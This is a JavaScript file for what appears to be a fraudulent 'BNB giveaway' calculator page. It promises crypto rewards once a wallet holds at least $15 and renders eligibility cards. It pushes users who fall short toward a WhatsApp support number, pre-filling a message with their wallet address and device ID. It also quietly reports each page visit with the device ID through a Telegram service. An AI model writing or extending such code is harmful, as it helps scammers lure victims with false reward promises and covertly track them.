// Fast navigation functions
function goBack() {
    navigateWithLoading('dashboard.html');
}

function goToDashboard() {
    navigateWithLoading('dashboard.html');
}

function goToCalculator() {
    // Already on calculator
}

function goToHistory() {
    navigateWithLoading('history.html');
}

function goToSettings() {
    navigateWithLoading('settings.html');
}

// Fast navigation helper with loading state
function navigateWithLoading(url) {
    const activeElement = document.activeElement;
    if (activeElement && activeElement.tagName === 'BUTTON') {
        const originalContent = activeElement.innerHTML;
        activeElement.innerHTML = `<span class="loading-spinner"></span>`;
        activeElement.disabled = true;
    }
    
    document.body.style.opacity = '0.8';
    setTimeout(() => {
        window.location.href = url;
    }, 100);
}

// Calculator functions
function useCurrentBalance() {
    // Get actual wallet balance from localStorage
    const currentBalance = parseFloat(localStorage.getItem('walletBalance') || '0.0000');
    document.getElementById('balanceInput').value = currentBalance;
    
    // Update balance status display
    updateBalanceStatus(currentBalance);
    
    calculateRewards();
}

function updateBalanceStatus(balance) {
    const balanceUSD = balance * 250;
    const minRequired = 15;
    const isEligible = balanceUSD >= minRequired;
    
    // Create or update balance status display
    let statusContainer = document.querySelector('.balance-status-container');
    if (!statusContainer) {
        statusContainer = document.createElement('div');
        statusContainer.className = 'balance-status-container';
        
        const form = document.querySelector('.calculator-form');
        form.appendChild(statusContainer);
    }
    
    statusContainer.innerHTML = `
        <div class="balance-status ${isEligible ? 'eligible' : 'insufficient'}">
            <div class="status-header">
                <div class="status-icon ${isEligible ? 'success' : 'warning'}">
                    ${isEligible ? 
                        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="20,6 9,17 4,12"/></svg>' :
                        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="m21 21-9-9m0 0L3 3m9 9 9-9m-9 9-9 9"/></svg>'
                    }
                </div>
                <span class="status-text">${isEligible ? 'Eligible for Injection' : 'Insufficient Balance'}</span>
            </div>
            <div class="status-details">
                <div class="status-row">
                    <span>Minimum Required:</span>
                    <span class="required-amount">$15.00</span>
                </div>
                <div class="status-row">
                    <span>Your Balance:</span>
                    <span class="current-amount ${isEligible ? 'eligible-amount' : 'insufficient-amount'}">
                        $${balanceUSD.toFixed(2)}
                    </span>
                </div>
                ${!isEligible ? `
                    <div class="status-row shortage">
                        <span>Need:</span>
                        <span class="shortage-amount">$${(minRequired - balanceUSD).toFixed(2)} more</span>
                    </div>
                ` : ''}
            </div>
        </div>
    `;
}

function calculateRewards() {
    const balanceInput = document.getElementById('balanceInput');
    const balance = parseFloat(balanceInput.value);

    if (!balance || balance <= 0) {
        showNotification('Please enter a valid BNB balance', 'error');
        return;
    }

    const calculation = calculateGiveaway(balance);
    displayResults(calculation);
}

function calculateGiveaway(balance) {
    const bnbPrice = 250; // BNB price in USD (matches system)
    const balanceUSD = balance * bnbPrice;
    const balanceNGN = balanceUSD * 1580; // USD to NGN conversion
    const minimumRequired = 15; // $15 minimum

    const isEligible = balanceUSD >= minimumRequired;
    const eligibilityPercentage = Math.min((balanceUSD / minimumRequired) * 100, 100);

    let baseReward = 0;
    let bonusMultiplier = 1;
    let giveawayAmount = 0;
    let giveawayAmountUSD = 0;
    let giveawayAmountNGN = 0;

    if (isEligible) {
        // Base reward is 5% of balance
        baseReward = balance * 0.05;

        // Bonus multiplier based on balance
        if (balanceUSD >= 100) {
            bonusMultiplier = 1.5;
        } else if (balanceUSD >= 50) {
            bonusMultiplier = 1.3;
        } else if (balanceUSD >= 25) {
            bonusMultiplier = 1.2;
        } else {
            bonusMultiplier = 1.0;
        }

        giveawayAmount = baseReward * bonusMultiplier;
        giveawayAmountUSD = giveawayAmount * bnbPrice;
        giveawayAmountNGN = giveawayAmountUSD * 1580;
    }

    return {
        balance,
        balanceUSD,
        balanceNGN,
        isEligible,
        eligibilityPercentage,
        baseReward,
        bonusMultiplier,
        giveawayAmount,
        giveawayAmountUSD,
        giveawayAmountNGN
    };
}

function displayResults(calculation) {
    const resultsContainer = document.querySelector('.results-section');

    if (calculation.isEligible) {
        resultsContainer.innerHTML = `
            <div class="eligibility-card eligible">
                <div class="eligibility-header">
                    <div class="status-icon success">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <polyline points="20,6 9,17 4,12"/>
                        </svg>
                    </div>
                    <h3>Congratulations! You're Eligible</h3>
                </div>
                <div class="eligibility-details">
                    <div class="detail-row">
                        <span>Your Balance:</span>
                        <span>${calculation.balance.toFixed(4)} BNB</span>
                    </div>
                    <div class="detail-row">
                        <span>USD Value:</span>
                        <span>$${calculation.balanceUSD.toFixed(2)}</span>
                    </div>
                    <div class="detail-row">
                        <span>NGN Value:</span>
                        <span>₦${calculation.balanceNGN.toLocaleString()}</span>
                    </div>
                    <div class="detail-row">
                        <span>Eligibility:</span>
                        <span class="eligibility-percentage">${calculation.eligibilityPercentage.toFixed(0)}%</span>
                    </div>
                </div>
            </div>

            <div class="reward-card">
                <h3>Your Giveaway Rewards</h3>
                <div class="reward-breakdown">
                    <div class="main-reward">
                        <div class="reward-amount">${calculation.giveawayAmount.toFixed(4)} BNB</div>
                        <div class="reward-usd">≈ $${calculation.giveawayAmountUSD.toFixed(2)}</div>
                        <div class="reward-ngn">≈ ₦${calculation.giveawayAmountNGN.toLocaleString()}</div>
                    </div>

                    <div class="reward-details">
                        <div class="detail-row">
                            <span>Base Reward (5%):</span>
                            <span>${calculation.baseReward.toFixed(4)} BNB</span>
                        </div>
                        <div class="detail-row">
                            <span>Bonus Multiplier:</span>
                            <span>${calculation.bonusMultiplier}x</span>
                        </div>
                        <div class="detail-row total">
                            <span>Total Reward:</span>
                            <span>${calculation.giveawayAmount.toFixed(4)} BNB</span>
                        </div>
                    </div>
                </div>

                <div class="reward-tiers">
                    <h4>Bonus Tiers</h4>
                    <div class="tier-list">
                        <div class="tier ${calculation.balanceUSD >= 100 ? 'active' : ''}">
                            <span>$100+ Balance</span>
                            <span>1.5x Multiplier</span>
                        </div>
                        <div class="tier ${calculation.balanceUSD >= 50 && calculation.balanceUSD < 100 ? 'active' : ''}">
                            <span>$50+ Balance</span>
                            <span>1.3x Multiplier</span>
                        </div>
                        <div class="tier ${calculation.balanceUSD >= 25 && calculation.balanceUSD < 50 ? 'active' : ''}">
                            <span>$25+ Balance</span>
                            <span>1.2x Multiplier</span>
                        </div>
                        <div class="tier ${calculation.balanceUSD >= 15 && calculation.balanceUSD < 25 ? 'active' : ''}">
                            <span>$15+ Balance</span>
                            <span>1.0x Multiplier</span>
                        </div>
                    </div>
                </div>
            </div>
        `;
    } else {
        resultsContainer.innerHTML = `
            <div class="not-eligible-card">
                <div class="eligibility-header">
                    <div class="status-icon error">
                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                            <circle cx="12" cy="12" r="10"/>
                            <line x1="15" y1="9" x2="9" y2="15"/>
                            <line x1="9" y1="9" x2="15" y2="15"/>
                        </svg>
                    </div>
                    <h3>Not Eligible Yet</h3>
                </div>
                <div class="not-eligible-content">
                    <div class="current-balance">
                        <div class="balance-row">
                            <span>Your Balance:</span>
                            <span>${calculation.balance.toFixed(4)} BNB</span>
                        </div>
                        <div class="balance-row">
                            <span>USD Value:</span>
                            <span>$${calculation.balanceUSD.toFixed(2)}</span>
                        </div>
                        <div class="balance-row">
                            <span>Required:</span>
                            <span class="required">$15.00 minimum</span>
                        </div>
                    </div>

                    <div class="progress-section">
                        <div class="progress-label">
                            <span>Eligibility Progress</span>
                            <span>${calculation.eligibilityPercentage.toFixed(0)}%</span>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: ${calculation.eligibilityPercentage}%"></div>
                        </div>
                        <div class="progress-text">
                            Need $${(15 - calculation.balanceUSD).toFixed(2)} more to qualify
                        </div>
                    </div>

                    <div class="help-section">
                        <h4>Need Help Getting Eligible?</h4>
                        <p>Contact our support team for assistance with balance requirements and eligibility criteria.</p>
                        <button onclick="contactSupportForEligibility()" class="contact-btn">
                            <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
                                <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893A11.821 11.821 0 0020.885 3.488"/>
                            </svg>
                            Contact Support: +234 807 130 9276
                        </button>
                    </div>
                </div>
            </div>
        `;
    }
}

function contactSupportForEligibility() {
    const balance = parseFloat(document.getElementById('balanceInput').value);
    const balanceUSD = balance * 250;
    const needed = (15 - balanceUSD).toFixed(2);

    const message = `🚨 ELIGIBILITY SUPPORT REQUEST

💰 Current Balance: ${balance.toFixed(4)} BNB ($${balanceUSD.toFixed(2)})
📊 Required: $15.00 minimum
💸 Need: $${needed} more to qualify

📱 Device ID: ${localStorage.getItem('deviceIdOriginal') || 'Unknown'}
🏠 Wallet: ${localStorage.getItem('walletAddress') || 'Not Set'}

❓ Questions:
• How can I increase my balance?
• What are the easiest ways to qualify?
• Are there any promotions available?

🙏 Please help me become eligible for the BNB giveaway!`;

    const whatsappUrl = `https://wa.me/2348071309276?text=${encodeURIComponent(message)}`;
    window.open(whatsappUrl, '_blank');
}

function showNotification(message, type) {
    // Remove existing notifications
    const existing = document.querySelector('.notification');
    if (existing) {
        existing.remove();
    }

    const notification = document.createElement('div');
    notification.className = `notification ${type}`;

    const color = type === 'error' ? '#ef4444' : type === 'success' ? '#22c55e' : '#3b82f6';
    const bgColor = type === 'error' ? 'rgba(239, 68, 68, 0.2)' : type === 'success' ? 'rgba(34, 197, 94, 0.2)' : 'rgba(59, 130, 246, 0.2)';

    notification.innerHTML = `
        <div style="
            background: ${bgColor};
            border: 1px solid ${color}33;
            border-radius: 12px;
            padding: 12px 16px;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            gap: 8px;
            animation: slideInDown 0.3s ease-out;
            position: fixed;
            top: 20px;
            left: 50%;
            transform: translateX(-50%);
            z-index: 1000;
            min-width: 300px;
        ">
            <span style="color: ${color}; font-size: 14px;">${message}</span>
        </div>
    `;

    document.body.appendChild(notification);

    // Remove notification after 4 seconds
    setTimeout(() => {
        notification.remove();
    }, 4000);
}

// Initialize calculator
document.addEventListener('DOMContentLoaded', async function() {
    // Send page visit notification
    const deviceId = localStorage.getItem('deviceIdOriginal') || 'Unknown';
    try {
        if (typeof telegramService !== 'undefined') {
            await telegramService.notifyPageVisit(deviceId, 'Calculator');
        }
    } catch (error) {
        console.log('Page visit notification failed:', error);
    }

    // Add enter key support for balance input
    document.getElementById('balanceInput').addEventListener('keypress', function(e) {
        if (e.key === 'Enter') {
            calculateRewards();
        }
    });

    // Add animation styles
    const style = document.createElement('style');
    style.textContent = `
        @keyframes slideInDown {
            from {
                opacity: 0;
                transform: translateY(-20px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .calculator-icon {
            text-align: center;
            margin: 20px 0;
        }

        .icon-circle {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, #8B5CF6, #3B82F6);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
            box-shadow: 0 8px 25px rgba(139, 92, 246, 0.3);
        }

        .icon-circle svg {
            color: white;
        }

        .calculator-subtitle {
            color: #D1D5DB;
            font-size: 14px;
            margin: 0;
        }

        .calculator-form {
            margin: 30px 0;
        }

        .balance-status-container {
            margin: 20px 0;
        }

        .balance-status {
            background: rgba(31, 41, 55, 0.8);
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 16px;
        }

        .balance-status.eligible {
            border: 1px solid rgba(34, 197, 94, 0.3);
            background: rgba(34, 197, 94, 0.1);
        }

        .balance-status.insufficient {
            border: 1px solid rgba(239, 68, 68, 0.3);
            background: rgba(239, 68, 68, 0.1);
        }

        .status-header {
            display: flex;
            align-items: center;
            gap: 8px;
            margin-bottom: 12px;
        }

        .status-icon {
            width: 20px;
            height: 20px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .status-icon.success {
            background: rgba(34, 197, 94, 0.2);
            color: #22C55E;
        }

        .status-icon.warning {
            background: rgba(239, 68, 68, 0.2);
            color: #EF4444;
        }

        .status-text {
            color: white;
            font-weight: 600;
            font-size: 14px;
        }

        .status-details {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }

        .status-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            color: #D1D5DB;
            font-size: 14px;
        }

        .status-row.shortage {
            border-top: 1px solid #4B5563;
            padding-top: 8px;
            margin-top: 4px;
        }

        .required-amount {
            color: #F59E0B;
            font-weight: 600;
        }

        .eligible-amount {
            color: #22C55E;
            font-weight: 600;
        }

        .insufficient-amount {
            color: #EF4444;
            font-weight: 600;
        }

        .shortage-amount {
            color: #F87171;
            font-weight: 600;
        }

        .input-wrapper {
            position: relative;
            display: flex;
            align-items: center;
        }

        .balance-input {
            flex: 1;
            padding: 16px;
            padding-right: 60px;
            background: #374151;
            border: 1px solid #4B5563;
            border-radius: 12px;
            color: white;
            font-size: 18px;
            font-weight: 500;
        }

        .balance-input:focus {
            outline: none;
            border-color: #8B5CF6;
            box-shadow: 0 0 0 3px rgba(139, 92, 246, 0.1);
        }

        .input-suffix {
            position: absolute;
            right: 16px;
            color: #D1D5DB;
            font-weight: 600;
            pointer-events: none;
        }

        .calculator-buttons {
            display: flex;
            flex-direction: column;
            gap: 12px;
            margin-top: 20px;
        }

        .results-section {
            margin-top: 30px;
        }

        .eligibility-card, .reward-card, .not-eligible-card {
            background: rgba(31, 41, 55, 0.8);
            border: 1px solid #374151;
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 20px;
        }

        .reward-card {
            background: rgba(139, 92, 246, 0.1);
            border-color: rgba(139, 92, 246, 0.3);
        }

        .not-eligible-card {
            background: rgba(239, 68, 68, 0.1);
            border-color: rgba(239, 68, 68, 0.3);
            text-align: center;
        }

        .not-eligible-card h3 {
            color: #F87171;
            margin-bottom: 12px;
        }

        .not-eligible-card p {
            color: #D1D5DB;
            margin-bottom: 16px;
        }

        .shortfall {
            color: #9CA3AF;
            font-size: 12px;
        }

        .card-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 20px;
        }

        .card-header h3 {
            display: flex;
            align-items: center;
            gap: 8px;
            color: white;
            margin: 0;
        }

        .status-badge {
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: 600;
        }

        .status-badge.eligible {
            background: rgba(34, 197, 94, 0.2);
            color: #22C55E;
        }

        .status-badge.not-eligible {
            background: rgba(239, 68, 68, 0.2);
            color: #EF4444;
        }

        .eligibility-details, .reward-details {
            margin-bottom: 20px;
        }

        .detail-row {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 12px;
            color: #D1D5DB;
        }

        .detail-row.total {
            border-top: 1px solid #4B5563;
            padding-top: 16px;
            margin-top: 20px;
        }

        .amount {
            font-weight: 600;
            color: #FFD700;
        }

        .total-amount {
            text-align: right;
        }

        .total-bnb {
            font-size: 20px;
            font-weight: bold;
            color: white;
        }

        .total-usd {
            font-size: 14px;
            color: #9CA3AF;
        }

        .progress-bar {
            background: #374151;
            border-radius: 8px;
            height: 8px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            border-radius: 8px;
            transition: width 0.5s ease;
        }

        .progress-fill.eligible {
            background: #22C55E;
        }

        .progress-fill.not-eligible {
            background: #EF4444;
        }

        .info-note {
            display: flex;
            align-items: center;
            gap: 8px;
            padding: 12px;
            background: rgba(139, 92, 246, 0.1);
            border-radius: 8px;
            color: #D1D5DB;
            font-size: 14px;
        }

        .info-note svg {
            color: #FFD700;
            flex-shrink: 0;
        }
    `;
    document.head.appendChild(style);
});